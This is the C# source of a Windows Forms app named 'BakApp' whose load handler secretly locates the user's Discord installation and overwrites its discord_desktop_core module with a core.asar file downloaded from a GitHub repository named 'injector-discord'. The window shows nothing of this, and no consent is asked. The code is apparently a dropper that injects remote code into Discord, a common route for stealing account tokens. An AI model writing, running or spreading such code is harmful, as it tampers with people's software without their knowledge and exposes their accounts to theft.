using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

namespace BakApp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Dictionary<int, string> dd = new Dictionary<int, string>();
            String url = "https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/core.asar";
            String path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            String[] directories = System.IO.Directory.GetDirectories(path + "\\Discord");

            for (int i = 0; i < directories.Length; i++)
            {
                String dir = directories.GetValue(i).ToString();
                String num = string.Join("", dir.Split('\\').Last().Split('.')).Replace("app-", "");
                Console.WriteLine(dir + " " + num);
                try
                {
                    dd.Add(int.Parse(num), dir);
                }
                catch
                {

                }
            }

            dd.OrderBy(key => key.Key);
            check(dd.Last().Value + "\\modules");
            void check(String loc)
            {
                String[] dire = System.IO.Directory.GetDirectories(loc);
                for (int i = 0; i < dire.Length; i++)
                {
                    string dir = dire.GetValue(i).ToString();

                    if (dir.Split('\\').Last() == "discord_desktop_core")
                    {
                        Console.WriteLine(dir);
                        WebClient client = new WebClient();
                        Uri uri = new Uri(url);
                        string fileName = System.IO.Path.GetFileName(uri.AbsolutePath);
                        client.DownloadFile(uri, dir + "\\core.asar");
                    } else if(dir.Contains("discord_desktop_core")) {
                        check(dir);
                    }
                }
            }
        }
    }
}
